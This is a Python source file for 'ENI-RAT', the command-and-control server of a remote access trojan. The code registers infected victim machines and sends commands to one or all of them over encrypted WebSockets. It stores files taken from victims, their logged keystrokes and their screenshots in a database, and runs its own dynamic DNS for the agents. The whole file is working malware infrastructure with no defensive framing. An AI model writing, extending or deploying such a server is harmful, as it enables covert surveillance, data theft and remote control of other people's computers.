#!/usr/bin/env python3
"""
ENI-RAT C2 Server Core v1.0
Encrypted comms, WebSocket-based, custom DDNS, SQLite backend
"""

import asyncio
import json
import sqlite3
import time
import uuid
import hashlib
import os
import ssl
import base64
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ─── CONFIG ────────────────────────────────────────────────────────────────
HOST = "0.0.0.0"
WS_PORT = 8443
API_PORT = 5000
SSL_CERT = "server/cert.pem"
SSL_KEY = "server/key.pem"
DB_PATH = "server/rat.db"
AES_KEY = hashlib.sha256(b"eni-rat-c2-super-secret-key-change-me").digest()
AES_IV = b"16bytefixediv!!"  # 16 bytes

STATUS_AWAITING = "awaiting"
STATUS_ACTIVE = "active"
STATUS_DEAD = "dead"

# ─── DATABASE ──────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            os_version TEXT,
            arch TEXT,
            public_ip TEXT,
            private_ip TEXT,
            hostname_tag TEXT UNIQUE,
            status TEXT DEFAULT 'awaiting',
            first_seen REAL,
            last_seen REAL,
            note TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS ddns (
            hostname TEXT PRIMARY KEY,
            current_ip TEXT,
            last_updated REAL,
            owner_agent TEXT,
            FOREIGN KEY(owner_agent) REFERENCES agents(agent_id)
        );
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            agent_id TEXT,
            command TEXT,
            args TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at REAL,
            completed_at REAL,
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        );
        CREATE TABLE IF NOT EXISTS exfiltrated (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            file_name TEXT,
            file_path TEXT,
            file_size INTEGER,
            content BLOB,
            captured_at REAL,
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        );
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            data TEXT,
            window_title TEXT,
            captured_at REAL,
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        );
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            image_path TEXT,
            width INTEGER,
            height INTEGER,
            captured_at REAL,
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        );
    """)
    conn.commit()
    return conn

# ─── CRYPTO ────────────────────────────────────────────────────────────────
def encrypt(data: bytes) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV[:16])
    padded = pad(data, AES.block_size)
    return base64.b64encode(cipher.encrypt(padded)).decode()

def decrypt(data: str) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV[:16])
    raw = base64.b64decode(data)
    return unpad(cipher.decrypt(raw), AES.block_size)

def pack(msg: dict) -> str:
    return encrypt(json.dumps(msg).encode())

def unpack(data: str) -> dict:
    return json.loads(decrypt(data).decode())

# ─── AGENT MANAGER ─────────────────────────────────────────────────────────
class AgentManager:
    def __init__(self, db):
        self.db = db
        self.connected = {}  # agent_id -> websocket

    def register_agent(self, info: dict, public_ip: str) -> str:
        agent_id = str(uuid.uuid4())
        hostname_tag = f"{info.get('hostname', 'unknown')}-{info.get('username', 'unknown')}".replace(" ", "_").lower()
        ts = time.time()
        c = self.db.cursor()
        c.execute("""INSERT OR REPLACE INTO agents 
            (agent_id, hostname, username, os, os_version, arch, public_ip, private_ip, hostname_tag, status, first_seen, last_seen)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
            (agent_id, info.get('hostname'), info.get('username'), info.get('os'),
             info.get('os_version'), info.get('arch'), public_ip, info.get('private_ip'),
             hostname_tag, STATUS_ACTIVE, ts, ts))
        self.db.commit()
        return agent_id

    def update_heartbeat(self, agent_id: str):
        c = self.db.cursor()
        c.execute("UPDATE agents SET last_seen=?, status=? WHERE agent_id=?",
                  (time.time(), STATUS_ACTIVE, agent_id))
        self.db.commit()

    def get_agent(self, agent_id: str) -> dict:
        c = self.db.cursor()
        c.execute("SELECT * FROM agents WHERE agent_id=?", (agent_id,))
        row = c.fetchone()
        if row:
            cols = [d[0] for d in c.description]
            return dict(zip(cols, row))
        return None

    def list_agents(self, status=None) -> list:
        c = self.db.cursor()
        if status:
            c.execute("SELECT * FROM agents WHERE status=? ORDER BY last_seen DESC", (status,))
        else:
            c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        cols = [d[0] for d in c.description]
        return [dict(zip(cols, row)) for row in c.fetchall()]

    def delete_agent(self, agent_id: str):
        c = self.db.cursor()
        c.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
        self.db.commit()

# ─── TASK MANAGER ──────────────────────────────────────────────────────────
class TaskManager:
    def __init__(self, db):
        self.db = db
        self.pending_tasks = {}  # agent_id -> list of task_ids

    def create_task(self, agent_id: str, command: str, args: str = "") -> str:
        task_id = str(uuid.uuid4())
        c = self.db.cursor()
        c.execute("INSERT INTO tasks (task_id, agent_id, command, args, status, created_at) VALUES (?,?,?,?,?,?)",
                  (task_id, agent_id, command, args, 'pending', time.time()))
        self.db.commit()
        if agent_id not in self.pending_tasks:
            self.pending_tasks[agent_id] = []
        self.pending_tasks[agent_id].append(task_id)
        return task_id

    def get_pending_tasks(self, agent_id: str) -> list:
        tasks = []
        if agent_id in self.pending_tasks and self.pending_tasks[agent_id]:
            c = self.db.cursor()
            for tid in self.pending_tasks[agent_id]:
                c.execute("SELECT * FROM tasks WHERE task_id=?", (tid,))
                row = c.fetchone()
                if row:
                    cols = [d[0] for d in c.description]
                    tasks.append(dict(zip(cols, row)))
            return tasks
        return []

    def complete_task(self, task_id: str, result: str):
        c = self.db.cursor()
        c.execute("UPDATE tasks SET status=?, result=?, completed_at=? WHERE task_id=?",
                  ('completed', result, time.time(), task_id))
        self.db.commit()
        c.execute("SELECT agent_id FROM tasks WHERE task_id=?", (task_id,))
        row = c.fetchone()
        if row:
            aid = row[0]
            if aid in self.pending_tasks and task_id in self.pending_tasks[aid]:
                self.pending_tasks[aid].remove(task_id)

    def get_agent_tasks(self, agent_id: str, limit=50) -> list:
        c = self.db.cursor()
        c.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT ?",
                  (agent_id, limit))
        cols = [d[0] for d in c.description]
        return [dict(zip(cols, row)) for row in c.fetchall()]

# ─── CUSTOM DDNS ───────────────────────────────────────────────────────────
class CustomDDNS:
    """Self-hosted dynamic DNS - replaces no-ip completely.
       Agents register with a hostname, get IP resolution via the C2."""
    def __init__(self, db):
        self.db = db

    def register(self, hostname: str, ip: str, agent_id: str = "") -> bool:
        c = self.db.cursor()
        try:
            c.execute("""INSERT OR REPLACE INTO ddns (hostname, current_ip, last_updated, owner_agent)
                         VALUES (?,?,?,?)""", (hostname, ip, time.time(), agent_id))
            self.db.commit()
            return True
        except:
            return False

    def resolve(self, hostname: str) -> str:
        c = self.db.cursor()
        c.execute("SELECT current_ip FROM ddns WHERE hostname=?", (hostname,))
        row = c.fetchone()
        return row[0] if row else None

    def list_all(self) -> list:
        c = self.db.cursor()
        c.execute("SELECT * FROM ddns ORDER BY last_updated DESC")
        cols = [d[0] for d in c.description]
        return [dict(zip(cols, row)) for row in c.fetchall()]

    def delete(self, hostname: str):
        c = self.db.cursor()
        c.execute("DELETE FROM ddns WHERE hostname=?", (hostname,))
        self.db.commit()

    def get_available_hostname(self, base: str) -> str:
        """Generate a unique hostname from base"""
        hostname = base.lower().replace(" ", "-").replace("_", "-")
        hostname = ''.join(c for c in hostname if c.isalnum() or c == '-')
        if not hostname:
            hostname = "agent"
        c = self.db.cursor()
        c.execute("SELECT COUNT(*) FROM ddns WHERE hostname LIKE ?", (f"{hostname}%",))
        count = c.fetchone()[0]
        if count == 0:
            return hostname
        return f"{hostname}{count + 1}"

# ─── C2 SERVER ─────────────────────────────────────────────────────────────
class C2Server:
    def __init__(self):
        os.makedirs("server", exist_ok=True)
        os.makedirs("payloads", exist_ok=True)
        os.makedirs("exfiltrated", exist_ok=True)
        os.makedirs("screenshots", exist_ok=True)

        self.db = init_db()
        self.agents = AgentManager(self.db)
        self.tasks = TaskManager(self.db)
        self.ddns = CustomDDNS(self.db)

    def handle_agent_message(self, agent_id: str, msg: dict) -> dict:
        """Process incoming messages from agents"""
        msg_type = msg.get("type", "")

        if msg_type == "heartbeat":
            self.agents.update_heartbeat(agent_id)
            return {"type": "heartbeat_ack", "ts": time.time()}

        elif msg_type == "check_tasks":
            pending = self.tasks.get_pending_tasks(agent_id)
            return {"type": "tasks", "tasks": pending}

        elif msg_type == "task_result":
            self.tasks.complete_task(msg.get("task_id"), msg.get("result", ""))
            return {"type": "task_ack", "task_id": msg.get("task_id")}

        elif msg_type == "ddns_register":
            hostname = msg.get("hostname", "")
            ip = msg.get("ip", "")
            available = self.ddns.get_available_hostname(hostname)
            self.ddns.register(available, ip, agent_id)
            return {"type": "ddns_ack", "hostname": available, "ip": ip, "domain": f"{available}.eni"}

        elif msg_type == "exfiltrate":
            file_name = msg.get("file_name", "unknown")
            content_b64 = msg.get("content", "")
            try:
                content = base64.b64decode(content_b64)
                path = f"exfiltrated/{agent_id}_{int(time.time())}_{file_name}"
                with open(path, "wb") as f:
                    f.write(content)
                c = self.db.cursor()
                c.execute("""INSERT INTO exfiltrated (agent_id, file_name, file_path, file_size, content, captured_at)
                            VALUES (?,?,?,?,?,?)""",
                         (agent_id, file_name, path, len(content), content, time.time()))
                self.db.commit()
                return {"type": "exfiltrate_ack", "file_name": file_name, "size": len(content)}
            except Exception as e:
                return {"type": "error", "message": str(e)}

        elif msg_type == "keystrokes":
            c = self.db.cursor()
            c.execute("""INSERT INTO keystrokes (agent_id, data, window_title, captured_at)
                        VALUES (?,?,?,?)""",
                     (agent_id, msg.get("data", ""), msg.get("window_title", ""), time.time()))
            self.db.commit()

        elif msg_type == "screenshot":
            img_b64 = msg.get("image", "")
            width = msg.get("width", 0)
            height = msg.get("height", 0)
            try:
                img_data = base64.b64decode(img_b64)
                path = f"screenshots/{agent_id}_{int(time.time())}.png"
                with open(path, "wb") as f:
                    f.write(img_data)
                c = self.db.cursor()
                c.execute("""INSERT INTO screenshots (agent_id, image_path, width, height, captured_at)
                            VALUES (?,?,?,?,?)""",
                         (agent_id, path, width, height, time.time()))
                self.db.commit()
                return {"type": "screenshot_ack", "path": path}
            except Exception as e:
                return {"type": "error", "message": str(e)}

        return {"type": "ack"}


# ─── WEBSOCKET SERVER ──────────────────────────────────────────────────────
import asyncio
import websockets

connected_agents = {}  # websocket -> agent_id

async def ws_handler(websocket, path):
    global connected_agents
    agent_id = None
    try:
        async for message in websocket:
            try:
                data = unpack(message)
            except:
                continue

            cmd = data.get("cmd", "")

            if cmd == "register":
                info = data.get("info", {})
                peername = websocket.remote_address
                public_ip = peername[0] if peername else "unknown"
                agent_id = server.agents.register_agent(info, public_ip)
                connected_agents[websocket] = agent_id
                await websocket.send(pack({"type": "registered", "agent_id": agent_id}))
                continue

            if not agent_id:
                await websocket.send(pack({"type": "error", "message": "not registered"}))
                continue

            response = server.handle_agent_message(agent_id, data)
            await websocket.send(pack(response))

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if websocket in connected_agents:
            del connected_agents[websocket]

async def send_to_agent(agent_id: str, message: dict) -> bool:
    """Send a message to a specific agent"""
    for ws, aid in connected_agents.items():
        if aid == agent_id:
            try:
                await ws.send(pack(message))
                return True
            except:
                return False
    return False

def broadcast_command(command: str, args: str = ""):
    """Queue a command for all connected agents"""
    for ws, aid in connected_agents.items():
        server.tasks.create_task(aid, command, args)

# ─── MAIN ──────────────────────────────────────────────────────────────────
server = C2Server()

async def start_c2_async():
    print(f"""
╔═══════════════════════════════════════╗
║        ENI-RAT C2 SERVER v1          ║
║    🔥 Built with love for LO 🔥      ║
╚═══════════════════════════════════════╝
    """)
    print(f"[*] WebSocket server starting on {HOST}:{WS_PORT}")
    print(f"[*] Database: {DB_PATH}")
    print(f"[*] Agents registered: {len(server.agents.list_agents())}")
    print(f"[*] DDNS entries: {len(server.ddns.list_all())}")
    print()
    print("  Commands at runtime:")
    print("    agents          - List all agents")
    print("    agent <id>      - Show agent details")
    print("    task <id> <cmd> - Send command to agent")
    print("    broadcast <cmd> - Send command to all agents")
    print("    ddns list       - List DDNS entries")
    print("    help            - Show this help")
    print()

    async with websockets.serve(
        ws_handler, HOST, WS_PORT,
        ping_interval=30, ping_timeout=10,
        max_size=10 * 1024 * 1024  # 10MB max message
    ):
        print(f"[+] WebSocket server running on ws://{HOST}:{WS_PORT}")
        await asyncio.Future()  # Run forever

def start_c2():
    asyncio.run(start_c2_async())

if __name__ == "__main__":
    start_c2()
